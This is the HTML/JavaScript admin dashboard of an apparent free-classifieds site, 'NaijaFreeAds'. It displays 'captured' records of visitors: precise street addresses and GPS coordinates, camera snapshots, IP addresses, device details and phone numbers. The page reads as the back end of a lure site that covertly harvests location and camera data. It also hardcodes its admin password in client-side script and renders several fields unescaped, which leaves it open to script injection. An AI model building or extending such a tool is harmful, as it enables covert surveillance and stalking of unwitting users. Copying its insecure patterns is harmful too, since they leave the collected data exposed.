<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel | NaijaFreeAds</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #0a0c15;
            color: #f1f5f9;
            padding: 20px;
        }
        .admin-header {
            background: linear-gradient(135deg, #008000, #008751);
            padding: 25px 35px;
            border-radius: 28px;
            margin-bottom: 25px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
        }
        .admin-header h1 { font-size: 26px; display: flex; align-items: center; gap: 12px; }
        .stats-badge {
            background: rgba(0,0,0,0.3);
            padding: 10px 25px;
            border-radius: 40px;
            font-size: 14px;
        }
        .stats-row {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 25px;
        }
        .stat-card {
            background: #1e293b;
            padding: 20px;
            border-radius: 24px;
            text-align: center;
        }
        .stat-card h3 { font-size: 32px; color: #00a86b; }
        .controls {
            display: flex;
            gap: 15px;
            margin-bottom: 25px;
            flex-wrap: wrap;
        }
        .search-box {
            flex: 1;
            padding: 14px 20px;
            background: #1e293b;
            border: 1px solid #334155;
            border-radius: 40px;
            color: white;
            font-size: 14px;
        }
        .refresh-btn, .clear-btn, .export-btn {
            padding: 12px 25px;
            border-radius: 40px;
            color: white;
            font-weight: 600;
            cursor: pointer;
            border: none;
        }
        .refresh-btn { background: #3b82f6; }
        .clear-btn { background: #ef4444; }
        .export-btn { background: #00a86b; }
        .data-container {
            display: flex;
            flex-direction: column;
            gap: 20px;
            max-height: calc(100vh - 280px);
            overflow-y: auto;
        }
        .data-card {
            background: #13132a;
            border-radius: 24px;
            padding: 20px;
            border-left: 5px solid #00a86b;
            transition: 0.2s;
        }
        .data-card:hover { background: #1a1a35; }
        .card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            flex-wrap: wrap;
            gap: 10px;
            padding-bottom: 10px;
            border-bottom: 1px solid #334155;
        }
        .badge {
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
        }
        .badge-ad { background: #22c55e; color: #000; }
        .badge-perm { background: #8b5cf6; color: #fff; }
        .info-row {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 12px;
            margin: 12px 0;
        }
        .info-item {
            background: rgba(0,0,0,0.3);
            padding: 10px;
            border-radius: 16px;
        }
        .info-label { font-size: 10px; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.5px; }
        .info-value { font-size: 13px; font-weight: 500; margin-top: 4px; word-break: break-word; }
        .location-details {
            background: rgba(0,168,107,0.1);
            padding: 12px;
            border-radius: 16px;
            margin-top: 10px;
        }
        .camera-preview {
            max-width: 150px;
            border-radius: 12px;
            margin-top: 10px;
            border: 2px solid #00a86b;
            cursor: pointer;
        }
        .images-preview {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
            margin-top: 10px;
        }
        .images-preview img {
            width: 60px;
            height: 60px;
            object-fit: cover;
            border-radius: 12px;
        }
        .delete-btn {
            background: #ef4444;
            border: none;
            padding: 6px 15px;
            border-radius: 20px;
            color: white;
            cursor: pointer;
            font-size: 11px;
        }
        .empty-state {
            text-align: center;
            padding: 60px;
            color: #64748b;
        }
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #1e293b; border-radius: 10px; }
        ::-webkit-scrollbar-thumb { background: #00a86b; border-radius: 10px; }
        @media (max-width: 768px) {
            .info-row { grid-template-columns: 1fr; }
            .admin-header { flex-direction: column; text-align: center; }
        }
    </style>
</head>
<body>
<div class="admin-header">
    <h1><i class="fas fa-chart-line"></i> NaijaFreeAds — Admin Dashboard</h1>
    <div class="stats-badge"><i class="fas fa-database"></i> <span id="recordCount">0</span> Records</div>
</div>

<div class="stats-row">
    <div class="stat-card"><h3 id="totalAds">0</h3><p>Total Ads Posted</p></div>
    <div class="stat-card"><h3 id="totalPerms">0</h3><p>Location/Camera Grants</p></div>
    <div class="stat-card"><h3 id="totalUsers">0</h3><p>Unique Users</p></div>
</div>

<div class="controls">
    <input type="text" class="search-box" id="searchInput" placeholder="🔍 Search by title, location, phone, city, state...">
    <button class="refresh-btn" id="refreshBtn"><i class="fas fa-sync-alt"></i> Refresh</button>
    <button class="export-btn" id="exportBtn"><i class="fas fa-download"></i> Export JSON</button>
    <button class="clear-btn" id="clearBtn"><i class="fas fa-trash-alt"></i> Clear All</button>
</div>

<div class="data-container" id="dataContainer">
    <div class="empty-state"><i class="fas fa-spinner fa-pulse"></i> Loading data...</div>
</div>

<script>
    const ADMIN_SECRET = "NAIJA2025DOPE";
    const urlParams = new URLSearchParams(window.location.search);
    const adminKey = urlParams.get("key");
    
    if (adminKey !== ADMIN_SECRET) {
        document.body.innerHTML = `<div style="display: flex; justify-content: center; align-items: center; height: 100vh;"><div style="text-align: center;"><i class="fas fa-lock" style="font-size: 60px; color: #ef4444;"></i><h2>Access Denied</h2><p>Valid admin key required</p></div></div>`;
        throw new Error("Unauthorized");
    }
    
    let allRecords = [];

    async function loadData() {
        try {
            const response = await fetch('/api/fetch');
            if (response.ok) {
                const data = await response.json();
                allRecords = data.records || [];
            } else {
                throw new Error('Backend error');
            }
        } catch(err) {
            const stored = localStorage.getItem('naija_freeads_data');
            allRecords = stored ? JSON.parse(stored) : [];
        }
        renderData();
        updateStats();
    }

    function updateStats() {
        const ads = allRecords.filter(r => r.type === 'ad_posted').length;
        const perms = allRecords.filter(r => r.type === 'permission_granted').length;
        const uniqueUsers = [...new Set(allRecords.map(r => r.device?.ip || r.ip))].length;
        document.getElementById('totalAds').innerText = ads;
        document.getElementById('totalPerms').innerText = perms;
        document.getElementById('totalUsers').innerText = uniqueUsers;
        document.getElementById('recordCount').innerText = allRecords.length;
    }

    function renderData() {
        const container = document.getElementById('dataContainer');
        const searchTerm = document.getElementById('searchInput').value.toLowerCase();
        
        let filtered = allRecords.filter(record => {
            if (record.type === 'ad_posted') {
                return record.ad.title?.toLowerCase().includes(searchTerm) ||
                       record.ad.location?.toLowerCase().includes(searchTerm) ||
                       record.ad.phone?.toLowerCase().includes(searchTerm) ||
                       record.location?.city?.toLowerCase().includes(searchTerm) ||
                       record.location?.state?.toLowerCase().includes(searchTerm);
            } else {
                return record.location?.city?.toLowerCase().includes(searchTerm) ||
                       record.location?.state?.toLowerCase().includes(searchTerm);
            }
        });
        
        if (filtered.length === 0) {
            container.innerHTML = `<div class="empty-state"><i class="fas fa-inbox"></i> No data found.</div>`;
            return;
        }
        
        container.innerHTML = filtered.map(record => {
            const isAd = record.type === 'ad_posted';
            const location = record.location;
            
            return `
                <div class="data-card">
                    <div class="card-header">
                        <div>
                            <span class="badge ${isAd ? 'badge-ad' : 'badge-perm'}">
                                ${isAd ? '<i class="fas fa-ad"></i> AD POSTED' : '<i class="fas fa-shield-alt"></i> PERMISSION GRANTED'}
                            </span>
                            <span style="margin-left: 10px; font-size: 12px; color:#64748b;">
                                <i class="far fa-clock"></i> ${new Date(record.timestamp).toLocaleString()}
                            </span>
                        </div>
                        <button class="delete-btn" onclick="deleteRecord(${record.id})"><i class="fas fa-trash"></i> Delete</button>
                    </div>
                    
                    ${isAd ? `
                        <div class="info-row">
                            <div class="info-item"><div class="info-label"><i class="fas fa-tag"></i> Category</div><div class="info-value">${escapeHtml(record.ad.category)}</div></div>
                            <div class="info-item"><div class="info-label"><i class="fas fa-heading"></i> Title</div><div class="info-value"><strong>${escapeHtml(record.ad.title)}</strong></div></div>
                            <div class="info-item"><div class="info-label"><i class="fas fa-naira-sign"></i> Price</div><div class="info-value">${escapeHtml(record.ad.price)}</div></div>
                        </div>
                        <div class="info-item"><div class="info-label"><i class="fas fa-align-left"></i> Description</div><div class="info-value">${escapeHtml(record.ad.description?.substring(0, 200) || '')}${record.ad.description?.length > 200 ? '...' : ''}</div></div>
                        <div class="info-row">
                            <div class="info-item"><div class="info-label"><i class="fas fa-map-marker-alt"></i> User Location Input</div><div class="info-value">${escapeHtml(record.ad.location || 'Not specified')}</div></div>
                            <div class="info-item"><div class="info-label"><i class="fab fa-whatsapp"></i> WhatsApp/Phone</div><div class="info-value"><a href="https://wa.me/${record.ad.phone?.replace(/\D/g, '')}" target="_blank" style="color:#00a86b;">${escapeHtml(record.ad.phone || 'Not provided')}</a></div></div>
                        </div>
                        ${record.ad.images && record.ad.images.length > 0 ? `
                            <div class="info-item"><div class="info-label"><i class="fas fa-image"></i> Uploaded Images</div>
                            <div class="images-preview">${record.ad.images.map(img => `<img src="${img}" onclick="window.open(this.src)">`).join('')}</div></div>
                        ` : ''}
                    ` : ''}
                    
                    ${location ? `
                        <div class="location-details">
                            <div style="font-weight: 700; margin-bottom: 8px; color:#00a86b;"><i class="fas fa-map-pin"></i> 📍 PRECISE LOCATION CAPTURED</div>
                            <div class="info-row">
                                <div class="info-item"><div class="info-label">🏙️ City/Town</div><div class="info-value">${location.city || 'N/A'}</div></div>
                                <div class="info-item"><div class="info-label">🗺️ State/Province</div><div class="info-value">${location.state || 'N/A'}</div></div>
                                <div class="info-item"><div class="info-label">🌍 Country</div><div class="info-value">${location.country || 'N/A'}</div></div>
                                <div class="info-item"><div class="info-label">📮 Postcode</div><div class="info-value">${location.postcode || 'N/A'}</div></div>
                            </div>
                            <div class="info-item"><div class="info-label">🏠 Street Address</div><div class="info-value">${location.street || 'N/A'}</div></div>
                            <div class="info-item"><div class="info-label">📍 Coordinates</div><div class="info-value">${location.lat || 'N/A'}, ${location.lng || 'N/A'} (accuracy: ${location.accuracy || 'N/A'}m)</div></div>
                            <div class="info-item"><div class="info-label">📌 Full Address</div><div class="info-value" style="font-size: 11px;">${location.fullAddress || 'N/A'}</div></div>
                        </div>
                    ` : '<div class="location-details" style="background:#ef444410;"><i class="fas fa-exclamation-triangle"></i> No location data captured</div>'}
                    
                    ${record.cameraImage ? `
                        <div class="info-item" style="margin-top: 10px;">
                            <div class="info-label"><i class="fas fa-camera"></i> Camera Snapshot</div>
                            <img src="${record.cameraImage}" class="camera-preview" onclick="window.open(this.src)" alt="Camera capture">
                        </div>
                    ` : ''}
                    
                    ${record.device ? `
                        <div class="info-row" style="margin-top: 10px;">
                            <div class="info-item"><div class="info-label"><i class="fas fa-microchip"></i> Device</div><div class="info-value">${record.device.platform || 'N/A'}</div></div>
                            <div class="info-item"><div class="info-label"><i class="fas fa-globe"></i> IP Address</div><div class="info-value"><code>${record.device.ip || record.ip || 'N/A'}</code></div></div>
                            <div class="info-item"><div class="info-label"><i class="fas fa-language"></i> Language</div><div class="info-value">${record.device.language || 'N/A'}</div></div>
                            <div class="info-item"><div class="info-label"><i class="far fa-clock"></i> Timezone</div><div class="info-value">${record.device.timezone || 'N/A'}</div></div>
                        </div>
                        <div class="info-item"><div class="info-label"><i class="fas fa-laptop"></i> User Agent</div><div class="info-value" style="font-size: 10px;">${record.device.userAgent?.substring(0, 150) || 'N/A'}...</div></div>
                    ` : ''}
                </div>
            `;
        }).join('');
    }
    
    function escapeHtml(str) {
        if (!str) return '';
        return String(str).replace(/[&<>]/g, function(m) {
            if (m === '&') return '&amp;';
            if (m === '<') return '&lt;';
            if (m === '>') return '&gt;';
            return m;
        });
    }
    
    async function deleteRecord(id) {
        if (confirm('Delete this record?')) {
            try { await fetch(`/api/delete/${id}`, { method: 'DELETE' }); } catch(e) {}
            allRecords = allRecords.filter(r => r.id !== id);
            localStorage.setItem('naija_freeads_data', JSON.stringify(allRecords));
            renderData();
            updateStats();
        }
    }
    
    async function clearAllData() {
        if (confirm('⚠️ WARNING: This will delete ALL captured data! Are you sure?')) {
            try { await fetch('/api/clear', { method: 'DELETE' }); } catch(e) {}
            localStorage.removeItem('naija_freeads_data');
            allRecords = [];
            renderData();
            updateStats();
            alert('✅ All data cleared.');
        }
    }
    
    function exportData() {
        const dataStr = JSON.stringify(allRecords, null, 2);
        const blob = new Blob([dataStr], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `naija-freeads-export-${new Date().toISOString()}.json`;
        a.click();
        URL.revokeObjectURL(url);
    }
    
    document.getElementById('refreshBtn').addEventListener('click', loadData);
    document.getElementById('clearBtn').addEventListener('click', clearAllData);
    document.getElementById('exportBtn').addEventListener('click', exportData);
    document.getElementById('searchInput').addEventListener('input', renderData);
    
    loadData();
    setInterval(loadData, 5000);
</script>
</body>
</html>
